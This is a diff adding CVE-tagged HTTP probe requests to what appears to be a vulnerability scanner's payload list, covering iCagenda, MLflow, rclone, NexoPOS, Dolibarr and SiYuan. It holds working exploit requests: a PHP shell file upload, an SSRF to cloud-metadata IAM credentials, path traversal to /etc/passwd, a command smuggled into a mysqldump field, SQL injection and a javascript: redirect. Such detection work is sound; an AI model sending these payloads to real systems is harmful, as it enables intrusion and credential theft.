@@ -4631,3 +4631,33 @@ GET /weaver/ln.FileDownload?fpath=..%2f..%2f..%2f..%2fWEB-INF%2Fweb.xml
 # --- CVE-2022-51025 (WAPPLES): file read through the name parameter of
 #     /webapi/file/transfer; the systemi account is hard-coded. ---
 GET /webapi/file/transfer?type=db_backup&name=../../../../etc/passwd
+
+# --- CVE-2026-48939 (iCagenda for Joomla, KEV): the public event submission
+#     keeps the client-supplied extension and writes attachments under
+#     images/icagenda/frontend/attachments. ---
+POST /index.php?option=com_icagenda&task=event.submit header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7068700d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-64849 (MLflow, KEV): the unauthenticated webhook test follows
+#     redirects without pinning the validated address, reaching cloud metadata. ---
+POST /api/2.0/mlflow/webhooks/1/test header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
+
+# --- CVE-2026-116191 (rclone serve webdav): an unvalidated '..' path component
+#     escapes the served root when creating a collection or writing a file. ---
+MKCOL /%2e%2e/other-tenant
+PUT /%2e%2e/other-tenant/planted.txt body="rclone traversal"
+
+# --- CVE-2026-107092 (NexoPOS): POST /api/update concatenates the migration
+#     filename onto modules/ and passes it to require(). ---
+POST /api/update header="Content-Type: application/json" body="{\"module\":{\"namespace\":\"test\",\"migrations\":[\"../../../../does-not-exist\"]}}"
+
+# --- CVE-2026-116219 (Dolibarr): the mysqldump value in the admin export tool
+#     chains commands around the allowlisted basename. ---
+POST /admin/tools/export.php header="Content-Type: application/x-www-form-urlencoded" body="mysqldump=mysqldump;id"
+
+# --- CVE-2026-116218 (Dolibarr): the bankaccounts REST type field is
+#     concatenated into CompanyBankAccount::create() without escaping. ---
+POST /api/index.php/thirdparties/1/bankaccounts header="Content-Type: application/json" body="{\"type\":\"x' AND (SELECT SLEEP(5))-- -\"}"
+
+# --- CVE-2026-116167 (SiYuan): the unauthenticated /check-auth page assigns
+#     the to parameter to window.location.href without a scheme check. ---
+GET /check-auth?to=javascript:alert(1)
